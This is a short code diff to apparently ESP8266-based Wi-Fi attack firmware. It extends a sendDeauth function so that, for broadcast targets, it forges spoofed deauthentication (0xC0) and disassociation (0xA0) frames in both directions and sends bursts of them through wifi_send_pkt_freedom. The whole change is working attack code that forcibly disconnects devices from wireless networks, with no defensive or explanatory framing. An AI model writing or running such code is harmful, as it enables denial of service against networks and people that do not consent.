@@ -94,10 +94,27 @@ void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t rea
       wifi_send_pkt_freedom(deauthPacket, 26, 0);
     }
   }
+  else
+  {
+    // For broadcast, also send from broadcast to AP
+    memcpy(&deauthPacket[4], apMac, 6);      // Receiver = AP
+    memcpy(&deauthPacket[10], clientMac, 6); // Transmitter = Broadcast
+    memcpy(&deauthPacket[16], apMac, 6);     // BSSID = AP
 
-  deautherPacketsSent += memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0 ? 20 : 10;
-  Serial.print("Packets sent so far: ");
-  Serial.println(deautherPacketsSent);
+    deauthPacket[0] = 0xC0;
+    for (int i = 0; i < 5; i++)
+    {
+      wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    }
+
+    deauthPacket[0] = 0xA0;
+    for (int i = 0; i < 5; i++)
+    {
+      wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    }
+  }
+
+  deautherPacketsSent += 20;
 }
 
 void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
